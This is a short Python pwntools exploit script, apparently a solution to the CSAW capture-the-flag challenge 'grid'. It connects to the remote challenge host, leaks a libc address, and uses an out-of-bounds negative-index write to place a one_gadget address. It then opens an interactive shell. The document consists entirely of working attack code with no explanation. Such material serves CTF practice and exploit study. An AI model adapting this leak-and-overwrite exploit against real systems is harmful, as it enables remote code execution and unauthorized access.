from pwn import *
e = ELF('./grid')
libc = e.libc
#p = process(e.path, env = {'LD_PRELOAD':'./libstdc.so.6.0.25'})
p = remote('pwn.chal.csaw.io', 5013)
idx = -85
def do(char):
    global idx
    p.recvuntil('shape>', timeout=0.5)
    p.sendline(char)
    p.recvuntil('loc> ', timeout=0.5)
    p.sendline('5'+str(idx))
    p.recvuntil('shape> ', timeout=0.5)
    p.sendline('d')
    idx -= 1

p.sendlineafter('shape> ', 'd')
leak = p.recv()
libc.address = u64(leak[37:43] + "\x00"*2)-0x4ec5da
log.succes('Libc leak: '+hex(libc.address))
pog = p64(libc.address+0x4f365)[::-1][2:] # one_gadget
for i in pog:
    do(i)

pause()
for i in range(2):
    p.sendline('\x00')
p.interactive()
